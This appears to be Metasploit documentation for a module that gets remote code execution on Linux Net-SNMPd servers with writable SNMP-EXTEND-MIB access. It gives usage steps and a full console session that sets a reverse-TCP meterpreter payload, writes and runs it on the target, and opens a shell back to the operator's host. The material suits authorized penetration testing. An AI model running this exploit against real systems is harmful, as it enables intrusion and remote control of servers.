## Vulnerable Application

  This module uses SNMP extension MIBs to enable remote code execution on the Linux Net-SNMPD servers using the 
  SNMP-EXTEND-MIB.

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/linux/snmp/net_snmpd_rw_access`
  3. Do: `set rhost [IP]`
  4. Do: `set community [SNMP Community]`
  5. Do: `set version [SNMP Version]`
  6. Configure the payload
  7. Do: `run`
  8. You should get a session


## Scenario

  ```
  msf > use exploit/linux/snmp/net_snmpd_rw_access 
  msf exploit(linux/snmp/net_snmpd_rw_access) > set payload linux/x86/meterpreter/reverse_tcp
  payload => linux/x86/meterpreter/reverse_tcp
  msf exploit(linux/snmp/net_snmpd_rw_access) > set rhost 192.168.1.3
  rhost => 192.168.1.3
  msf exploit(linux/snmp/net_snmpd_rw_access) > set lhost 192.168.1.2
  lhost => 192.168.1.2
  msf exploit(linux/snmp/net_snmpd_rw_access) > set community private
  community => private
  msf exploit(linux/snmp/net_snmpd_rw_access) > set version 2c
  version => 2c

  msf exploit(linux/snmp/net_snmpd_rw_access) > show info
  
         Name: Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution
       Module: exploit/linux/snmp/net_snmpd_rw_access
     Platform: 
         Arch: 
   Privileged: No
      License: Metasploit Framework License (BSD)
         Rank: Normal

  Provided by:
    Steve Embling at InteliSecure

  Available targets:
    Id  Name
    --  ----
    0   Linux x86

  Basic options:
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    CHUNKSIZE  200              yes       Maximum bytes of payload to write at once 
    COMMUNITY  private          yes       SNMP Community String
    FILEPATH   /tmp             yes       file path to write to 
    RETRIES    1                yes       SNMP Retries
    RHOST      192.168.1.3      yes       The target address
    RPORT      161              yes       The target port (UDP)
    TIMEOUT    1                yes       SNMP Timeout
    VERSION    2c               yes       SNMP Version <1/2c>

  Payload information:
    Space: 4096

  Description:
    This exploit module exploits the SNMP write access configuration 
    ability of SNMP-EXTEND-MIB to configure MIB extensions and lead to 
    remote code execution.

  References:
    https://www.intelisecure.com

  msf exploit(linux/snmp/net_snmpd_rw_access) > run

  [*] Started reverse TCP handler on 192.168.1.2:4444 
  [*] Writing to NET-SNMP-EXTEND-MIB with given payload
  [*] Payload generated. Sending in 200 byte chunk increments.
  [*] Sent chunked executable. Now executing payload
  [*] Sending stage (849108 bytes) to 192.168.1.3
  [+] SNMP request timeout (this is promising).

  meterpreter > exit
  [*] Shutting down Meterpreter...
 
  [*] 192.168.1.3 - Meterpreter session 1 closed.  Reason: User exit
  ```
